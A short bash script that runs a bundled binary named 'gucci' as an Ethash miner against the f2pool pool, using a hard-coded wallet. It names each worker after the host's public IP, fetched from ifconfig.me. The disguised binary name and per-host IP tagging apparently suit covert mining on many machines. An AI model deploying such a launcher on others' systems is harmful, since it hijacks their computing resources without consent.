#!/bin/bash

POOL=stratum+tcp://eth.f2pool.com:6688
WALLET=0x729fc14f6f6464891cdb8f70d093bb58815b21b8
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-lol

cd "$(dirname "$0")"

chmod +x ./gucci && ./gucci --algo ETHASH --pool $POOL --user $WALLET.$WORKER --tls 1 $@
